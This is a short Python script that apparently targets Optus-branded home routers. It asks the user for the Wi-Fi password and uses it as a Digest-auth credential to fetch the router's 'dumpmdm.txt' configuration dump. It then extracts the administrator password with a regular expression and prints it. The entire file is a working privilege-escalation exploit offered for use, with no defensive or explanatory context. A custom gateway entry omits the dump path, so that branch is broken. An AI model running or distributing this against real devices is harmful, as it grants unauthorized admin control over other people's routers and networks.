#!/usr/bin/env python3
import requests
from requests.auth import HTTPDigestAuth


url = input("What's your default gateway? (Leave blank to default to 192.168.0.1, reccomended)\n")
if url == "":
    print("Empty, defaulting to 192.168.0.1")
    url = 'http://192.168.0.1/dumpmdm.txt'

password = input("What is your password? (Used to access the wifi network):\n")
if password != "":
    result = requests.get(url, auth=HTTPDigestAuth("optus", password)).text
else:
    raise ValueError("Password Cannot Be Empty")

import re
reg = "(?<=&lt;AdminPassword&gt;)[^<>]*(?=&lt;/AdminPassword&gt;)"
match = re.search(reg, result)
print("Admin Login is:\n admin:" + str(match.group()))
